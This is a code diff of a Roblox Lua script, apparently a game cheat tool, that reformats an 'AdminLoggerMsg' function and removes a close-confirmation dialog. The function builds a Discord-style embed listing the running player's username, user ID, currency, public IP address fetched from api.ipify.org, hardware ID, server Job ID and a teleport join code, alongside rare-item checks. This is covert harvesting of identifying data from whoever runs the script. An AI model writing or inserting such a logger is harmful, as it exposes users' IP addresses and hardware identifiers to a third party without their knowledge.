@@ -72,6 +72,16 @@ spawn(function()
     end
 end)
 
+local function formatNumberWithCommas(n)
+    local s = tostring(n)
+    local result = s:reverse():gsub("(%d%d%d)", "%1,")
+    result = result:reverse()
+    -- Nếu đầu chuỗi là dấu phẩy, loại bỏ nó
+    if result:sub(1,1) == "," then
+        result = result:sub(2)
+    end
+    return result
+end
 
 --//Code Ui
 local TweenService = game:GetService("TweenService")
@@ -108,67 +118,66 @@ end
 
 function AdminLoggerMsg(hasGodsChalice, hasFistOfDarkness)
     local player = game.Players.LocalPlayer
-    local beli = player:FindFirstChild("Data") and player.Data:FindFirstChild("Beli") and player.Data.Beli.Value or 0
+    local beli = player:FindFirstChild("Data")
+                 and player.Data:FindFirstChild("Beli")
+                 and player.Data.Beli.Value or 0
 
     local AdminMessage = {
-        ["embeds"] = {
-            {
-                ["title"] = "**📦 Inventory Check!**",
-                ["description"] = "",
-                ["color"] = tonumber(0xffffff),
-                ["fields"] = {
-                    {
-                        ["name"] = "**👤 Username**",
-                        ["value"] = "```" .. player.Name .. "```",
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "**🗿UserID**",
-                        ["value"] = "```" .. player.UserId .. "```",
-                        ["inline"] = true
-                    },
-                    {
-                        -- Thay GameID thành Beli
-                        ["name"] = "**💰 Beli**",
-                        ["value"] = "```" .. tostring(beli) .. "```",
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "**🌇IP Address**",
-                        ["value"] = "```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```",
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "💻 HWID",
-                        ["value"] = "```" .. (gethwid and gethwid() or "Unknown") .. "```",
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "🧭 Job ID",
-                        ["value"] = "```" .. game.JobId .. "```",
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "📜Join Code",
-                        ["value"] = "```lua\n" ..
-                                    "game.ReplicatedStorage['__ServerBrowser']:InvokeServer('teleport','" ..
-                                    game.JobId .. "')```",
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "️🏆God's Chalice",
-                        ["value"] = hasGodsChalice and "✅" or "❌",
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "🗝Fist of Darkness",
-                        ["value"] = hasFistOfDarkness and "✅" or "❌",
-                        ["inline"] = true
-                    },
+        embeds = {{
+            title       = "**📦 Inventory Check!**",
+            description = "",
+            color       = tonumber(0xffffff),
+            fields = {
+                {
+                    name   = "**👤 Username**",
+                    value  = "```" .. player.Name .. "```",
+                    inline = true
                 },
-                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
-            }
-        }
+                {
+                    name   = "**🗿UserID**",
+                    value  = "```" .. player.UserId .. "```",
+                    inline = true
+                },
+                {
+                    name   = "**💰 Beli**",
+                    value  = "```" .. formatNumberWithCommas(beli) .. "```",
+                    inline = false
+                },
+                {
+                    name   = "**🌇IP Address**",
+                    value  = "```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```",
+                    inline = false
+                },
+                {
+                    name   = "💻 HWID",
+                    value  = "```" .. (gethwid and gethwid() or "Unknown") .. "```",
+                    inline = false
+                },
+                {
+                    name   = "🧭 Job ID",
+                    value  = "```" .. game.JobId .. "```",
+                    inline = false
+                },
+                {
+                    name   = "📜Join Code",
+                    value  = "```lua\n" ..
+                             "game.ReplicatedStorage['__ServerBrowser']:InvokeServer(" ..
+                             "'teleport','" .. game.JobId .. "')```",
+                    inline = false
+                },
+                {
+                    name   = "️🏆God's Chalice",
+                    value  = hasGodsChalice and "✅" or "❌",
+                    inline = true
+                },
+                {
+                    name   = "🗝Fist of Darkness",
+                    value  = hasFistOfDarkness and "✅" or "❌",
+                    inline = true
+                },
+            },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%S")
+        }}
     }
     return AdminMessage
 end
@@ -447,59 +456,6 @@ local function CreateMainGui()
     closeBtn.TextColor3 = Color3.fromRGB(231, 76, 60)
     closeBtn.TextSize = 16
     CreateSmoothCorner(closeBtn)
-
-    -- Tạo cửa sổ xác nhận
-    local function createConfirmationDialog()
-        local dialog = Instance.new("ScreenGui")
-        dialog.Name = "ConfirmationDialog"
-        dialog.Parent = game.Players.LocalPlayer.PlayerGui
-    
-    -- Tạo Background
-        local bg = Instance.new("Frame")
-        bg.Size = UDim2.new(0, 300, 0, 150)
-        bg.Position = UDim2.new(0.5, -150, 0.5, -75)
-        bg.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-        bg.Parent = dialog
-    
-    -- Tiêu đề
-        local title = Instance.new("TextLabel")
-        title.Size = UDim2.new(1, 0, 0, 30)
-        title.Text = "Are you sure you want to close?"
-        title.TextColor3 = Color3.fromRGB(255, 255, 255)
-        title.BackgroundTransparency = 1
-        title.Parent = bg
-    
-    -- Nút "Có"
-        local yesBtn = Instance.new("TextButton")
-        yesBtn.Size = UDim2.new(0.4, 0, 0, 40)
-        yesBtn.Position = UDim2.new(0, 20, 0, 60)
-        yesBtn.Text = "Yes"
-        yesBtn.BackgroundColor3 = Color3.fromRGB(76, 175, 80)  -- Màu xanh lá
-        yesBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        yesBtn.Parent = bg
-        yesBtn.MouseButton1Click:Connect(function()
-            -- Thực hiện hành động đóng ứng dụng
-            game:Shutdown()  -- Hoặc hành động tắt game, tùy theo yêu cầu của bạn
-            dialog:Destroy()
-        end)
-    
-        -- Nút "Không"
-        local noBtn = Instance.new("TextButton")
-        noBtn.Size = UDim2.new(0.4, 0, 0, 40)
-        noBtn.Position = UDim2.new(0, 180, 0, 60)
-        noBtn.Text = "No"
-        noBtn.BackgroundColor3 = Color3.fromRGB(244, 67, 54)  -- Màu đỏ
-        noBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        noBtn.Parent = bg
-        noBtn.MouseButton1Click:Connect(function()
-            dialog:Destroy()  -- Đóng hộp thoại nếu chọn "Không"
-        end)
-    end
-
-    -- Khi bấm vào nút X
-    closeBtn.MouseButton1Click:Connect(function()
-        createConfirmationDialog()  -- Tạo và hiển thị hộp thoại xác nhận
-    end)
     
     local minimizeBtn = Instance.new("TextButton", titleBar)
     minimizeBtn.Size             = UDim2.new(0, 30, 0, 30)
